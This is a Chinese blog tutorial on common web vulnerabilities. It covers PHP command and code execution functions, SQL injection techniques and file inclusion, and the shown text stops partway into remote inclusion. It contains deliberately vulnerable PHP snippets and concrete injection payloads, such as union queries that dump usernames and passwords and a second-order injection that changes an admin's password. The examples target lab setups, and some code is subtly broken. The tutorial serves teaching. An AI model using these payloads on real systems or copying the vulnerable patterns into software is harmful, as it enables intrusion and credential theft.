<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Web 常见十大漏洞原理及利用方式 - 编程大咖</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:url" content="https://bcdaka.github.io/posts/d89b336fa5575d76de30d1b3cf6d7013/">
  <meta property="og:site_name" content="编程大咖">
  <meta property="og:title" content="Web 常见十大漏洞原理及利用方式">
  <meta property="og:description" content="一、PHP命令执行函数 原理:
命令执行函数解释:在PHP中有一些执行命令的函数，这些函数使你可以在PHP基本执行外部执行命令，并获取其输出的结果
漏洞产生原因： （1）没有对用户输入进行过滤或过滤不严 例如，没有过滤&amp;、&amp;&amp;、|、||等连接符 （2）系统漏洞造成的命令执行 bash破壳漏洞(CVE-2014-6271)，该漏洞可以构造环境变量的值来执行具有攻击力的脚本代码，会影响到bash交互的多种应用，如http、ssh和dhcp等 （3）调用的第三方组件存在代码执行漏洞 例如： php(system()、shell_exec()、exec()、eval()) JAVA中的命令执行漏洞(struts2/ElasticsearchGroovy等) ThinkPHP命令执行 php代码相关函数 eval() assert() preg_replace call_user_func() call_user_func_array() create_function array_map() 系统命令执行相关 system() passthru() exec() pcntl_exec() shell_exec() popen() proc_open() `(反单引号) ob_start() 特殊函数 phpinfo() #这个文件里面包含了PHP的编译选项，启动的扩展、版本、服务器配置信息、环境变量、操作系统信息、path变量等非常重要的敏感配置信息 symlink()： #一般是在linux服务器上使用的，为一个目标建立一个连接，在读取这个链接所连接的文件的内容，并返回内容 getenv #获取一个环境变量的值 putenv($a) #添加$a到服务器环境变量，但环境变量仅存活于当前请求期间。 在请求结束时环境会恢复到初始状态 1.1 PHP哪些是执行命令函数 exec(); exec();函数执行一个外部命令，并返回最后一行输出 实例： &lt;?php //代码审计命令注入 $action = $_GET(&#39;cmd&#39;); echo &#34;&lt;pre&gt;&#34;; echo exec($action); echo &#34;&lt;pre/&gt;&#34; ?&gt; shell_exec():shell_exec();函数执行一个shell命令， 并返回输出作为字符串，和exec()不同的是shell_exec()返回的是完整的内容，并不是最后一行 实例： &lt;?php //代码审计命令注入 $action = $_GET(&#39;cmd&#39;); echo &#34;&lt;pre&gt;&#34;; echo shell_exec($action); echo &#34;">
  <meta property="og:locale" content="zh_CN">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2024-04-18T14:26:21+08:00">
    <meta property="article:modified_time" content="2024-04-18T14:26:21+08:00">

	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
  


</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程大咖" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程大咖</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">Web 常见十大漏洞原理及利用方式</h1>
			
		</header>
		<div id="gatop"></div>
		<div class="content post__content clearfix">
			
<div id="content_views" class="markdown_views prism-atom-one-dark">
                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
                    </svg>
                    <h3><a id="PHP_0"></a>一、PHP命令执行函数</h3> 
<p><strong>原理:<br> 命令执行函数解释:在PHP中有一些执行命令的函数，这些函数使你可以在PHP基本执行外部执行命令，并获取其输出的结果</strong></p> 
<h4><a id="_4"></a>漏洞产生原因：</h4> 
<pre><code class="prism language-bash">（1）没有对用户输入进行过滤或过滤不严
例如，没有过滤<span class="token operator">&amp;</span>、<span class="token operator">&amp;&amp;</span>、<span class="token operator">|</span>、<span class="token operator">||</span>等连接符
（2）系统漏洞造成的命令执行
bash破壳漏洞<span class="token punctuation">(</span>CVE-2014-6271<span class="token punctuation">)</span>，该漏洞可以构造环境变量的值来执行具有攻击力的脚本代码，会影响到bash交互的多种应用，如http、ssh和dhcp等
（3）调用的第三方组件存在代码执行漏洞
例如：
php<span class="token punctuation">(</span>system<span class="token punctuation">(</span><span class="token punctuation">)</span>、shell_exec<span class="token punctuation">(</span><span class="token punctuation">)</span>、exec<span class="token punctuation">(</span><span class="token punctuation">)</span>、eval<span class="token punctuation">(</span><span class="token punctuation">))</span>
JAVA中的命令执行漏洞<span class="token punctuation">(</span>struts2/ElasticsearchGroovy等<span class="token punctuation">)</span>
ThinkPHP命令执行
</code></pre> 
<h4><a id="php_18"></a>php代码相关函数</h4> 
<pre><code class="prism language-bash">eval<span class="token punctuation">(</span><span class="token punctuation">)</span>
assert<span class="token punctuation">(</span><span class="token punctuation">)</span>
preg_replace
call_user_func<span class="token punctuation">(</span><span class="token punctuation">)</span>
call_user_func_array<span class="token punctuation">(</span><span class="token punctuation">)</span>
create_function
array_map<span class="token punctuation">(</span><span class="token punctuation">)</span>
系统命令执行相关
system<span class="token punctuation">(</span><span class="token punctuation">)</span>
passthru<span class="token punctuation">(</span><span class="token punctuation">)</span>
exec<span class="token punctuation">(</span><span class="token punctuation">)</span>
pcntl_exec<span class="token punctuation">(</span><span class="token punctuation">)</span>
shell_exec<span class="token punctuation">(</span><span class="token punctuation">)</span>
popen<span class="token punctuation">(</span><span class="token punctuation">)</span>
proc_open<span class="token punctuation">(</span><span class="token punctuation">)</span>
`<span class="token punctuation">(</span>反单引号<span class="token punctuation">)</span>
ob_start<span class="token punctuation">(</span><span class="token punctuation">)</span>
特殊函数
phpinfo<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token comment">#这个文件里面包含了PHP的编译选项，启动的扩展、版本、服务器配置信息、环境变量、操作系统信息、path变量等非常重要的敏感配置信息</span>
symlink<span class="token punctuation">(</span><span class="token punctuation">)</span>：
<span class="token comment">#一般是在linux服务器上使用的，为一个目标建立一个连接，在读取这个链接所连接的文件的内容，并返回内容</span>
getenv
<span class="token comment">#获取一个环境变量的值</span>
putenv<span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span>
<span class="token comment">#添加$a到服务器环境变量，但环境变量仅存活于当前请求期间。 在请求结束时环境会恢复到初始状态</span>
</code></pre> 
<h4><a id="11_PHP_49"></a>1.1 PHP哪些是执行命令函数</h4> 
<pre><code class="prism language-bash">exec<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> exec<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>函数执行一个外部命令，并返回最后一行输出
实例：
<span class="token operator">&lt;</span>?php
//代码审计命令注入
<span class="token variable">$action</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">(</span><span class="token string">'cmd'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token builtin class-name">echo</span> <span class="token string">"&lt;pre&gt;"</span><span class="token punctuation">;</span>
<span class="token builtin class-name">echo</span> exec<span class="token punctuation">(</span><span class="token variable">$action</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token builtin class-name">echo</span> <span class="token string">"&lt;pre/&gt;"</span>
?<span class="token operator">&gt;</span>

shell_exec<span class="token punctuation">(</span><span class="token punctuation">)</span>:shell_exec<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>函数执行一个shell命令，
并返回输出作为字符串，和exec<span class="token punctuation">(</span><span class="token punctuation">)</span>不同的是shell_exec<span class="token punctuation">(</span><span class="token punctuation">)</span>返回的是完整的内容，并不是最后一行
实例：
<span class="token operator">&lt;</span>?php
//代码审计命令注入
<span class="token variable">$action</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">(</span><span class="token string">'cmd'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token builtin class-name">echo</span> <span class="token string">"&lt;pre&gt;"</span><span class="token punctuation">;</span>
<span class="token builtin class-name">echo</span> shell_exec<span class="token punctuation">(</span><span class="token variable">$action</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token builtin class-name">echo</span> <span class="token string">"&lt;pre/&gt;"</span>
?<span class="token operator">&gt;</span>

system<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>system<span class="token punctuation">(</span><span class="token punctuation">)</span>函数执行一个外部命令，
并输出结果与exec<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>不同之处在于system<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>直接输出结果到输出流，而不是将其返回。
实例：
<span class="token operator">&lt;</span>?php
//代码审计命令注入
<span class="token variable">$action</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">(</span><span class="token string">'cmd'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token builtin class-name">echo</span> <span class="token string">"&lt;pre&gt;"</span><span class="token punctuation">;</span>
system<span class="token punctuation">(</span><span class="token variable">$action</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token builtin class-name">echo</span> <span class="token string">"&lt;pre/&gt;"</span>
?<span class="token operator">&gt;</span>

passthru<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>passthru<span class="token punctuation">(</span><span class="token punctuation">)</span>函数执行一个外部命令，
并将输出直接发送到标准输出。它与system<span class="token punctuation">(</span><span class="token punctuation">)</span>类似，但是不会对输出进行任何处理，直接将其发送到输出流。
实例：
<span class="token operator">&lt;</span>?php
//代码审计命令注入
<span class="token variable">$action</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">(</span><span class="token string">'cmd'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token builtin class-name">echo</span> <span class="token string">"&lt;pre&gt;"</span><span class="token punctuation">;</span>
passthru<span class="token punctuation">(</span><span class="token variable">$action</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token builtin class-name">echo</span> <span class="token string">"&lt;pre/&gt;"</span>
?<span class="token operator">&gt;</span>

`<span class="token variable"><span class="token variable">`</span>反引号 直接输出执行结果
实例：
<span class="token operator">&lt;</span>?php
//代码审计命令注入
$action <span class="token operator">=</span> $_GET<span class="token punctuation">(</span><span class="token string">'cmd'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token builtin class-name">echo</span> <span class="token string">"&lt;pre&gt;"</span><span class="token punctuation">;</span>
<span class="token builtin class-name">echo</span> <span class="token variable">`</span></span><span class="token variable">$action</span>`<span class="token punctuation">;</span>
<span class="token builtin class-name">echo</span> <span class="token string">"&lt;pre/&gt;"</span>
?<span class="token operator">&gt;</span>

Popen 返回一个执行结果
实例：
<span class="token operator">&lt;</span>?php
//代码审计命令注入
<span class="token variable">$action</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">(</span><span class="token string">'cmd'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token builtin class-name">echo</span> <span class="token string">"&lt;pre&gt;"</span><span class="token punctuation">;</span>
<span class="token builtin class-name">echo</span> popen<span class="token punctuation">(</span><span class="token variable">$action</span>,<span class="token string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token builtin class-name">echo</span> <span class="token string">"&lt;pre/&gt;"</span>
?<span class="token operator">&gt;</span>

<span class="token assign-left variable">cmd</span><span class="token operator">=</span>ls <span class="token parameter variable">-a</span> 返回值为2说明这个命令已经被执行了
</code></pre> 
<h4><a id="_118"></a>防御函数：</h4> 
<p><strong>当用户提供的数据传入函数，使用escapeshellarg() 或escapeshellcmd() 来确保用户欺骗系统从而执行任意命令。</strong></p> 
<pre><code class="prism language-bash">escapeshellarg <span class="token punctuation">(</span> string <span class="token variable">$arg</span> <span class="token punctuation">)</span>可以用到php 的安全中，会过滤掉arg 中存在的一些特殊字符。在输入的参数中如果包含中文传递给escapeshellarg，会被过滤掉。
escapeshellcmd <span class="token punctuation">(</span> string <span class="token variable">$command</span> <span class="token punctuation">)</span>
escapeshellcmd<span class="token punctuation">(</span><span class="token punctuation">)</span>函数会转义命令中的所有shell 元字符来完成工作。这些元字符包括：<span class="token comment"># &amp; ; ` ,| * ? ~ &lt; &gt; ^ ( ) [ ] { } $ \\。</span>
实例：
<span class="token operator">&lt;</span>?php
//代码审计命令注入
<span class="token variable">$action</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">(</span><span class="token string">'cmd'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token builtin class-name">echo</span> <span class="token string">"&lt;pre&gt;"</span><span class="token punctuation">;</span>
<span class="token builtin class-name">echo</span> shell_exec<span class="token punctuation">(</span>escapeshellcmd<span class="token punctuation">(</span><span class="token variable">$action</span><span class="token punctuation">))</span>
<span class="token builtin class-name">echo</span> <span class="token string">"&lt;pre/&gt;"</span>
?<span class="token operator">&gt;</span>
</code></pre> 
<h3><a id="PHP_136"></a>二、PHP代码执行函数</h3> 
<p><strong>代码执行函数：在php中有一些函数将输入的字符串参数当作PHP程序代码来执行</strong></p> 
<h4><a id="21__139"></a>2.1 常见的代码执行函数</h4> 
<p><strong>eval,assert,preg_replace</strong></p> 
<h5><a id="211_eval_142"></a>2.1.1 eval代码执行注入</h5> 
<pre><code class="prism language-bash"><span class="token operator">&lt;</span>?php
if<span class="token punctuation">(</span>isset<span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'gansir'</span><span class="token punctuation">]</span><span class="token punctuation">))</span><span class="token punctuation">{<!-- --></span>
<span class="token variable">$gansir</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'gansir'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
eval<span class="token punctuation">(</span><span class="token string">"\<span class="token variable">$gansir</span> = <span class="token variable">$gansir</span>;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
?<span class="token operator">&gt;</span>

当在网页输入xxx/234.php?gansir<span class="token operator">=</span>phpinfo*<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> phpinfo<span class="token punctuation">(</span><span class="token punctuation">)</span>代码将被直接执行并返回值
</code></pre> 
<h5><a id="222_assert_155"></a>2.2.2 assert代码执行注入</h5> 
<pre><code class="prism language-bash"><span class="token operator">&lt;</span>?php
if<span class="token punctuation">(</span>isset<span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'gansir'</span><span class="token punctuation">]</span><span class="token punctuation">))</span><span class="token punctuation">{<!-- --></span>
<span class="token variable">$gansir</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'gansir'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
assert<span class="token punctuation">(</span><span class="token string">"\<span class="token variable">$gansir</span> = <span class="token variable">$gansir</span>;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
?<span class="token operator">&gt;</span>
原理和上面的eval一样
</code></pre> 
<h5><a id="223_preg_replace__167"></a>2.2.3 preg_replace 正则代码执行注入</h5> 
<pre><code class="prism language-bash">当pattern 中存在/e 模式修饰符，即允许执行代码
pattern 在一个参数
<span class="token operator">&lt;</span>?php
<span class="token builtin class-name">echo</span> <span class="token variable">$regexp</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'reg'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$var</span> <span class="token operator">=</span> <span class="token string">'&lt;php&gt;phpinfo()&lt;/php&gt;'</span><span class="token punctuation">;</span>
preg_replace<span class="token punctuation">(</span><span class="token string">"/&lt;php&gt;(.*?)<span class="token variable">$regexp</span>"</span>, <span class="token string">'\\1'</span>, <span class="token variable">$var</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
?<span class="token operator">&gt;</span>
replacement 第二个参数
<span class="token operator">&lt;</span>?php
preg_replace<span class="token punctuation">(</span><span class="token string">"/gansir/e"</span>,<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'gansir'</span><span class="token punctuation">]</span>,<span class="token string">"I love gansir"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
?<span class="token operator">&gt;</span>

preg_replace<span class="token punctuation">(</span><span class="token punctuation">)</span>第三个参数注射
<span class="token operator">&lt;</span>?php
preg_replace<span class="token punctuation">(</span><span class="token string">"/\s\[php\](.+?)\[\/php\]\s/ies"</span>, <span class="token string">"<span class="token entity" title="\\">\\</span>1"</span>, <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'gansir'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
?<span class="token operator">&gt;</span>
</code></pre> 
<h3><a id="sql_188"></a>三、sql注入</h3> 
<h4><a id="sql_190"></a>原理:sql注入：</h4> 
<p>通过在应用程序中注入恶意的SQL代码，从而在后台数据库执行非授权的操作。SQL注入攻击通常利用应用程序对用户输入数据的不正确处理，使得攻击者能够执行未经授权的数据库查询、插入、更新或删除操作，甚至获取敏感数据。<br> 判断笔记: ?id=1’ " ) ))<br> 判断闭合可以加?id=1\ 查看闭合条件<br> 数字类型：’ "都会报错<br> 字符类型：’ "有一个报错</p> 
<h5><a id="31__196"></a>3.1 联合注入</h5> 
<p><strong>前提要求：数据会进行回显，页面有显位符，在一个在一个网站的正常页面，服务端执行SQL语句查询数据库中的数据，客户端将数 据展示在页面中，这个展示数据的位置就叫显示位</strong></p> 
<pre><code class="prism language-bash">数据库默认数据库保存了数据库中的数据库库名，表名，字段并解释
information_schema 是mysql数据库默认的数据库实例初始化完成就存在
SCHEMATA表：存储数据名称的，关键字段是SCHEMA_NAME
TABLES表：存储表名的TABLE_SCHEMA表示表所属的数据库名称
		TABLE_NAME表示表的名称。
<span class="token environment constant">COLUMNS</span>表:存储的字段名。
		COLUMN_NAME表示字段名。	
group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span>:打印出所有的表名称  
实例:select <span class="token number">1,2</span>,group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> from information_schema.tables where <span class="token assign-left variable">table_schema</span><span class="token operator">=</span><span class="token string">'security'</span> 打印出information_schema库下tables表中所有的表名称筛选条件为security库
实例：union <span class="token keyword">select</span> <span class="token number">1,2</span>,group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span> from information_schema.columns where <span class="token assign-left variable">table_schema</span><span class="token operator">=</span><span class="token string">'security'</span> and <span class="token assign-left variable">table_name</span><span class="token operator">=</span><span class="token string">'users'</span>--+ 查看security库中users表中的所有字段
实例：union <span class="token keyword">select</span> <span class="token number">1,2</span>,group_concat<span class="token punctuation">(</span>id,username,password<span class="token punctuation">)</span> from security.users --+   查看users表中的username ,id , password字段数据

实例（查看information库中的user表并获取字段）
数据库语句：SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.<span class="token environment constant">COLUMNS</span> WHERE TABLE_SCHEMA <span class="token operator">=</span> <span class="token string">'information'</span> AND TABLE_NAME <span class="token operator">=</span> <span class="token string">'user'</span><span class="token punctuation">;</span>
网页表现形式：http://172.16.16.23:8080/usera.php?name<span class="token operator">=</span>-1  and <span class="token assign-left variable">1</span><span class="token operator">=</span><span class="token number">2</span> union <span class="token keyword">select</span> <span class="token number">1,2</span>,3,4,COLUMN_NAME from INFORMATION_SCHEMA.<span class="token environment constant">COLUMNS</span> WHERE TABLE_SCHEMA <span class="token operator">=</span> <span class="token string">'information'</span>AND TABLE_NAME <span class="token operator">=</span> <span class="token string">'user'</span><span class="token punctuation">;</span> 

链表查询information_schema库中的数据库名称
UNION <span class="token keyword">select</span> SCHEMA_NAME,2 FROM information_schema.SCHEMATA<span class="token punctuation">;</span>

链表查询information_schema库中dvwa库中的表名
<span class="token number">1</span> UNION <span class="token keyword">select</span> TABLE_NAME,2 FROM information_schema.TABLES where <span class="token assign-left variable">TABLE_SCHEMA</span><span class="token operator">=</span><span class="token string">'dvwa'</span><span class="token punctuation">;</span>
十六进制格式：
<span class="token number">1</span> union <span class="token keyword">select</span> TABLE_NAME COLLATE utf8_general_ci,2 FROM information_schema.TABLES where <span class="token assign-left variable">TABLE_SCHEMA</span><span class="token operator">=</span>0x64767761 注意0x是机器识别码

链表查询information_schema库中dvwa库users的字段
<span class="token number">1</span> union <span class="token keyword">select</span> COLUMN_NAME COLLATE utf8_general_ci,2 FROM information_schema.<span class="token environment constant">COLUMNS</span> WHERE <span class="token assign-left variable">TABLE_SCHEMA</span><span class="token operator">=</span><span class="token string">'dvwa'</span> AND <span class="token assign-left variable">TABLE_NAME</span><span class="token operator">=</span><span class="token string">'users'</span><span class="token punctuation">;</span>
十六进制格式：
<span class="token number">1</span> union <span class="token keyword">select</span> COLUMN_NAME COLLATE utf8_general_ci,2 FROM information_schema.<span class="token environment constant">COLUMNS</span> WHERE <span class="token assign-left variable">TABLE_SCHEMA</span><span class="token operator">=</span>0x64767761 AND <span class="token assign-left variable">TABLE_NAME</span><span class="token operator">=</span>0x7573657273

链表查询dvwa库中users表中的user和password字段
<span class="token number">1</span> union <span class="token keyword">select</span> user,password from dvwa.users
</code></pre> 
<h5><a id="32__233"></a>3.2 布尔盲注</h5> 
<p>布尔为计算机中的一种数据类型，分为true、False两种类型，盲注则是表示注入过程中数据不会回显，只能根据页面返回两种内容的的不同来判断注入语句判断的内容是否正确<br> 在布尔盲注中通常需要使用连接符号and、or等字符来连接两个字符串<br> (1)首先猜解之前应当判断内容的长度(猜错无返回，猜对有返回)</p> 
<h5><a id="33__238"></a>3.3 时间盲注</h5> 
<p>时间类型的盲注本质是利用插入的SQL语句执行造成时间延迟;在猜解正确或者失败时执行造成时间延迟的语句,辅助判断是否内容猜解正确</p> 
<pre><code class="prism language-bash">常用sql盲注时造成时延的方法
sleep<span class="token punctuation">(</span><span class="token punctuation">)</span>
benchmark<span class="token punctuation">(</span><span class="token punctuation">)</span>
笛卡尔积
get_lock<span class="token punctuation">(</span><span class="token punctuation">)</span>函数
</code></pre> 
<h5><a id="34__249"></a>3.4 堆叠注入</h5> 
<p>堆叠注入的使用条件十分有限，其可能受到 API 或者数据库引擎，又或者权限的限制只有 当调用数据库函数支持执行多条 sql 语句时才能够使用，利用 mysqli_multi_query()函数就支持多条 sql 语句同时执行，但实际情况中，如 PHP 为了防止 sql 注入机制，往往使用调用数据库的函数是 mysqli_ query()函数，其只能执行一条语句，分号后面的内容将不会被执行，所 以可以说堆叠注入的使用条件十分有限，一旦能够被使用，将可能对网站造成十分大的威胁。<br> 在SQL数据库串，每条SQL语名是以；分开的，堆叠注入就是一次性注入入多条SQL语句；<br> 与union联合查询注入的区别：union联合查询注入执行的语句类型是有限的，可能用来执行查询语句。堆叠注入可以执行是任意的语句（增删改查）</p> 
<h5><a id="35__254"></a>3.5 报错注入</h5> 
<p>SQL报错注入就是利用数据库的某些机制，人为地制造错误条件，使得查询结果能够出现在错误信息中。这种手段在联合查询受限且能返回错误信息的情况下比较好用，目前对于各种不同类型数据库，不同版本数据库报错注入时可能并不能通用，常用可以通用的报错注入的方式有两种，xpath注入和主键重复导致的报错</p> 
<pre><code class="prism language-bash">常用sql报错注入的方法
xpath报错注入
extractvalue<span class="token punctuation">(</span>文档，路径<span class="token punctuation">)</span>
updatexml<span class="token punctuation">(</span><span class="token punctuation">)</span>除了语法与extractvalue<span class="token punctuation">(</span><span class="token punctuation">)</span>略有不同外，使用方法基本相同
主键重复报错注入
</code></pre> 
<h5><a id="36_httpheader_265"></a>3.6 http-header注入</h5> 
<p>验证客户端头信息，或者获取客户端的一些信息，会对客户端的http-header信息进行获取并使用sql语句进行处理，头注入就是将请求头中的数据放入数据库当做命令执行。</p> 
<h5><a id="37__268"></a>3.7 宽字节注入</h5> 
<p>如果程序设计数据库编码的时候设置了非英文编码，php发送请求到mysql时经过一次gbk编码，因为gbk是双字节编码，当设置gbk编码后，遇到了连续两个字节都符合gbk取值范围，会自动解析成一个汉字，输入%df%27，本来\会转义%27（’）,但\（%5c）的编码数为92，%df的编码数为223，符合取值范围，于是%df%5c会解析成为一个汉字“運”，单引号就逃逸了出来，从而绕过转义造成注入。</p> 
<h5><a id="38__271"></a>3.8 二次注入</h5> 
<p>第一次：在第一次进行数据库插入数据的时候，仅使用addslashes或者get_magic_quotes_gpc对其中的特殊字符进行转义，在写入数据库的时候还保留了原来的数据，但是数据本身还是脏数据；<br> 第二次：脏数据存入到数据库中之后，开发者就认为数成是可信的。在下一次进行需要查询的时候，直接从数据库中取出了脏数据，没有进行进一步的过滤，这样就造成了SQL二次注入；。</p> 
<pre><code class="prism language-bash">防：直接从数据库中取出脏数据进行过滤
攻击步骤：
<span class="token number">1</span>.找到系统里面存在admin用户
<span class="token number">2</span>.登陆页面和注册的页面我们发现都进行特殊字符处理；-按照以前的注入方法无法完成；
<span class="token number">3</span>.特点：我们注册它的特殊字符串能够直接写到数据库当中；我们这里能不能将特殊字符读出来?
二次注入实现方法
<span class="token number">1</span>.找到系统里面存在admin用户，我们的目标是修改admin用户的密码，这个时候我们就可以实现后台登陆；
<span class="token number">2</span>.我们要创建一个用户：admin’<span class="token comment"># ，密码任意 ：admin' #</span>
<span class="token number">3</span>.进入登陆界面：注册的 admin’<span class="token comment"># ，密码任意 ，  "SELECT * FROM users WHERE username='admin' #' and password='$password'";</span>
<span class="token number">4</span>.登陆成功之后的页面进行拼接：UPDATE <span class="token function">users</span> SET <span class="token assign-left variable">PASSWORD</span><span class="token operator">=</span><span class="token string">'$pass'</span> where <span class="token assign-left variable">username</span><span class="token operator">=</span><span class="token string">'admin’# '</span> and <span class="token assign-left variable">password</span><span class="token operator">=</span><span class="token string">'$curr_pass'</span>,实现了对admin用户进行了修改密码；
</code></pre> 
<h5><a id="39_DNSLOG_288"></a>3.9 DNSLOG注入</h5> 
<p>HTTP注入(Cookie注入,Referer注入,User-Agent注入,X-Forwarded-For (XFF) 注入)<br> Cookie注入：攻击者尝试在Cookie头部字段中插入恶意内容，以影响服务器的会话管理或认证机制。<br> Referer注入：Referer头部字段通常用于表示请求的来源页面。攻击者可能尝试篡改此字段以进行跨站请求伪造（CSRF）攻击或混淆服务器的日志记录。<br> User-Agent注入：User-Agent头部字段用于标识发出请求的浏览器或其他客户端软件。攻击者可能尝试修改此字段以绕过某些安全检测或伪装请求的来源。<br> X-Forwarded-For (XFF) 注入：X-Forwarded-For头部字段用于表示HTTP请求的来源IP地址。在代理或负载均衡器场景中常见。攻击者可能尝试伪造此字段以隐藏其真实IP地址或进行其他类型的攻击。</p> 
<h3><a id="_295"></a>四、文件包含漏洞</h3> 
<h5><a id="_297"></a>什么是文件包含：</h5> 
<p>文件包含一个文件调用另外一个文件，被包含的文件无论什么格式都可以被执行。</p> 
<h5><a id="41__299"></a>4.1 文件包含分为本地包含和远程包含</h5> 
<p>本地包含:：包含文件调用本地文件<br> 远程包含：包含文件调用远程地址文件<br> <strong>注意：远程包含需要的必要条件1、网络可以互相通信 2、被攻击端需要打开PHP的allow_url_fopne=On,allow_url_inclide=On</strong></p> 
<h5><a id="42_PHP_304"></a>4.2 文件包含的PHP函数</h5> 
<pre><code class="prism language-bash">include,include_once,require,require_once
include<span class="token punctuation">(</span><span class="token punctuation">)</span>:当使用该函数包含文件时，只有代码执行到include<span class="token punctuation">(</span><span class="token punctuation">)</span>函数时才将文件包含进来，发生错误时只出一个警告，继续向下执行。
include_once<span class="token punctuation">(</span><span class="token punctuation">)</span>:功能和include<span class="token punctuation">(</span><span class="token punctuation">)</span>相同，区别在于当重复调用同一文件时，程序只调用一次。
require<span class="token punctuation">(</span><span class="token punctuation">)</span>:require<span class="token punctuation">(</span><span class="token punctuation">)</span>与include<span class="token punctuation">(</span><span class="token punctuation">)</span>的区别在于require<span class="token punctuation">(</span><span class="token punctuation">)</span>执行如果发生错误，函数输出错误信息，并终止脚本的运行。
使用require<span class="token punctuation">(</span><span class="token punctuation">)</span>函数包含文件时，只要程序一执行，立即调用文件，而includer<span class="token punctuation">(</span><span class="token punctuation">)</span>只有程序执行到该函数时才调用，
require_once<span class="token punctuation">(</span><span class="token punctuation">)</span>：它的功能与require<span class="token punctuation">(</span><span class="token punctuation">)</span>相同，区别在于当重复调用同一文件时，程序只调用一次，
</code></pre> 
<h5><a id="43__315"></a>4.3 文件包含调用实例</h5> 
<pre><code class="prism language-bash">hao.php文件中有文件包含函数
例如：
<span class="token operator">&lt;</span>?php
if<span class="token punctuation">(</span>isset<span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">))</span><span class="token punctuation">{<!-- --></span>
    <span class="token variable">$file</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    include <span class="token variable">$file</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
?<span class="token operator">&gt;</span>
include 文件包含函数

本地文件包含调用实例
命令：http://172.16.16.23:8080/hao.php?file<span class="token operator">=</span>test2.php     test2.php是本地存在的一个文件
远程文件包含实例调用：
